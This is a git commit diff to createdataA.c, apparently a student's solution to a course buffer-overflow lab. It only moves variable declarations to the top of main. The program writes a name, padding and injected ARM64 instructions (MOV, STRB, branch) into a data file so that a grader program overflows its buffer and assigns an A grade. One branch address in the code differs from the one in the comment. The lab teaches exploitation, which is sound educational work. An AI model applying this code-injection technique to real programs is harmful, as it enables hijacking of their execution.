a78f38a42ddd391f17dcdcf717e4fb5ccb84b933
Jeonghyun Shin <js9523@princeton.edu>
2024-12-09 18:53:08 -0500

    mixed declarations

--- createdataA.c
+++ createdataA.c
@@ -13,18 +13,19 @@
  * causing the grader program to assign the A grade. 
  */
 int main() {
-    FILE *file = fopen("dataA", "wb");
+    FILE *file; 
+    int i; 
+    unsigned int MOV, STRB, B; 
+
+    file = fopen("dataA", "wb");
     if (!file) {
         perror("Unable to open file");
         return 1;
     }
 
-    /* write name to file. 
+    /* write name and null terminator to file. 
     grader program will ... */ 
     fwrite("Claire Shin", 1, 11, file);
-
-    /* null byte that signifies the termination of string. 
-    grader program will .... */
     fputc('\0', file);
 
     /* add padding so that buffer overflow can be performed 
@@ -34,18 +35,18 @@ int main() {
     }
 
     /* MOV grade A to register W0 using MiniAssembler */
-    unsigned int MOV = MiniAssembler_mov(0, 'A');
+    MOV = MiniAssembler_mov(0, 'A');
     fwrite(&MOV, sizeof(unsigned int), 1, file);
 
     /* STR content of register W0 into the address pointed by X1
     branch back to normal program flow after setting grade to A */
-    unsigned int STRB = MiniAssembler_strb(0, 1);
+    STRB = MiniAssembler_strb(0, 1);
     fwrite(&STRB, sizeof(unsigned int), 1, file);
 
     /* B back to return address */ 
     /* 0x4008c4 is address where getName is called; 
     0x4008b8 is instruction address right after getName returns */
-    unsigned int B = MiniAssembler_b(0x4008c4, 0x40087c); 
+    B = MiniAssembler_b(0x4008c4, 0x40087c); 
     fwrite(&B, sizeof(unsigned int), 1, file);
 
     fclose(file);
